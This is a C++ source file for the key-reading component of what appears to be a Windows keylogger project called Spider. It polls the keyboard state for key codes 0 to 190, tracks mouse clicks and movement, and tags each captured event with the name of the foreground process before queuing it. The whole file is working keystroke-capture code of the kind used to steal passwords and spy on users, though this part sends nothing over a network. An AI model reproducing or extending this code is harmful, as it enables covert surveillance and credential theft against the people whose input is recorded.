//!
//! \file KeyReader.cpp
//! \author mliani
//! \date 30/09/2017
//!

#define WIN32_LEAN_AND_MEAN
#include <SDKDDKVer.h>
#include <string>
#include <algorithm>
//#include <Psapi.h>
#include "Event/Event.hpp"
#include "Core/KeyReader.hpp"
#include <Psapi.h>
#include <windows.h>

namespace Spider
{
namespace Core
{

	std::string KeyReader::findActivity()
	{
		TCHAR title[256];
		HWND foreground = GetForegroundWindow();
		GetWindowText(foreground, title, 256);
		DWORD pid;
		GetWindowThreadProcessId(foreground, &pid);
		HANDLE Handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
		if (Handle)
		{
			TCHAR name[MAX_PATH];
			if (GetModuleFileNameEx(Handle, 0, name, MAX_PATH))
            {
                if (mOld.compare(static_cast<char *>(name)))
				{
					CloseHandle(Handle);
					char tmp[MAX_PATH];
					int i = 0;
					while (name[i] != 0)
					{
						tmp[i] = name[i];
						i++;
					}
					tmp[i] = 0;
                    mOld = tmp;
					return mOld;
				}
			}
			CloseHandle(Handle);
		}
		return "";
	}

	bool		KeyReader::isInvalidKey(int key)
	{
		if (std::find(mIgnoredChar.begin(), mIgnoredChar.end(), key)
			!= mIgnoredChar.end())
			return (true);
		return (false);
	}

	Event::ClickType	KeyReader::isClick(int key)
	{
		auto it = Event::associativeClick.find(key);
		return (it == Event::associativeClick.end() ? Event::NONE : it->second);
	}

	Event::ClickType	KeyReader::isMouseMove()
	{
		
		POINT		actualPoint;

		if (GetCursorPos(&actualPoint))
		{
			if (actualPoint.x == mSaveX && actualPoint.y == mSaveY)
				return (Event::NONE);
			mSaveX = actualPoint.x;
			mSaveY = actualPoint.y;
		}
		if ((GetKeyState(VK_LBUTTON) & 0x100) != 0)
			return (Event::LEFT_CLICK);
		else if ((GetKeyState(VK_MBUTTON) & 0x100) != 0)
			return (Event::MIDDLE_CLICK);
		else if ((GetKeyState(VK_RBUTTON) & 0x100) != 0)
			return (Event::RIGHT_CLICK);
		return (Event::NONE);
	}

	void KeyReader::read(Event::EventQueue *queue)
	{
		std::string tmp = findActivity();
		if (!tmp.empty())
		{
			int i = tmp.size() - 1;
			for (; i != 0 && tmp[i] != '\\'; i--);
			mActivity = tmp.substr(i + 1, tmp.size());
//			queue->push(new Event::UserActivity(mActivity));
			return;
		}
		Event::ClickType click = isMouseMove();
		if (click != Event::NONE)
		{
			queue->push(new Event::Click(click, mActivity));
			return;
		}
		for (unsigned char key = 0; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == IsTheTouch)
			{
				click = isClick(key);
				if (click != Event::NONE)
				{
					queue->push(new Event::Click(click, mActivity));
					return;
				}
				if (!isInvalidKey(key))
				{
					Event::Keyboard *keyboard = new Event::Keyboard(mActivity);
					keyboard->setKey(key);
					queue->push(keyboard);
					return;
				}
			}
		}
	}
}
}